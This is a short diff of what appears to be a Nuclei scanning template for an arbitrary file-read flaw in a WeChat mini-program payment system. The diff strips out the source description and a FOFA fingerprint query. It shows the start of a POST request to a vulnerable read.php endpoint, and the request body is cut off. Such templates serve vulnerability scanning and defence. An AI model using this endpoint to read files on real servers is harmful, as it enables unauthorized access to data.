@@ -3,12 +3,8 @@ info:
   name: A2425美团代付三合一微信小程序系统read.php前台任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ke1d07q6srbdiqcm'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ke1d07q6srbdiqcm
-    fofa: '"/h5/static/js/chunk-vendors.js"'
 http:
 - raw:
   - 'POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
